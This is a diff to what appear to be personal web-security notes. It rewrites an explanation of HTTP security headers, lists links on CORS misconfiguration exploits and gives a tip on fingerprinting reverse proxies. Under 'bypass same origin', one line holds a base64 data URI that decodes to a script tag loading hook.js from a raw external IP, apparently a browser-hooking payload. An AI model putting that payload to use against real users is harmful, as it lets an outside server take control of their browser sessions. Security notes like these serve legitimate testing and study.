@@ -1,7 +1,12 @@
 # http
 
-# X-Content-Security-Policy, Strict-Transport-Security, X-Frame-Options
-http://www.dsd.gov.au/publications/csocprotect/protecting_web_apps.htm
+# http://guides.rubyonrails.org/security.html https://www.cyber.gov.au/acsc/view-all-content/publications/protecting-web-applications-and-users
+X-Frame-Options 'SAMEORIGIN' - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' or ALLOW-FROM to allows all, one or more origins (wildcards are not permitted)
+X-XSS-Protection '1; mode=block' - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off (useful if response contents scripts from request parameters)
+X-Content-Type-Options 'nosniff' - stops the browser from guessing the MIME type of a file
+X-Content-Security-Policy - mitigates attacks such as cross-site scripting (XSS) and other attacks based on introducing malicious or otherwise undesirable content into a web application
+Access-Control-Allow-Origin - control which sites are allowed to bypass same origin policies and send cross-origin requests
+Strict-Transport-Security: max-age=31536000 ; includeSubDomains - forces the browser to always interact with the site over HTTPS
 
 # CORS (Access-Control-Allow-Origin)
 The Same-origin policy does not prevent requests being made to other origins, but disables access to the response from JavaScript. CORS headers allow access to cross-origin responses.
@@ -9,6 +14,7 @@ https://medium.com/statuscode/cors-a-guided-tour-4e72230a8739#.vrov01jfg pitfall
 https://ejj.io/breaking-sop/
 https://ejj.io/misconfigured-cors/
 http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html
+https://www.corben.io/advanced-cors-techniques/
 
 Firefox prevents this (otherwise xss to exfil secrets trivial)
 Access-Control-Allow-Origin: *
@@ -16,14 +22,6 @@ Access-Control-Allow-Credentials: true
 
 # bypass same origin (SOP)
 use data uri like data:text/html;base64,PGh0bWw+CjxzY3JpcHQgc3JjPSAiaHR0cDovLzEwNC4xMzEuNS4xNTA6ODAwMC9ob29rLmpzIjsgIHR5cGU9ICJ0ZXh0L2phdmFzY3JpcHQiID48L3NjcmlwdD4KPC9odG1sPgo=
-
-# http://guides.rubyonrails.org/security.html
-X-Frame-Options 'SAMEORIGIN' in Rails by default - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' if you want to allow framing for all website.
-X-XSS-Protection '1; mode=block' in Rails by default - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off(useful if response contents scripts from request parameters)
-X-Content-Type-Options 'nosniff' in Rails by default - stops the browser from guessing the MIME type of a file.
-X-Content-Security-Policy A powerful mechanism for controlling which sites certain content types can be loaded from
-Access-Control-Allow-Origin Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
-Strict-Transport-Security Used to control if the browser is allowed to only access a site over a secure connection
 
 # if there's a reverse proxy removing the Server: try to send http header with invalid values like with the Expect: header
 # BigIP <-> Tomcat
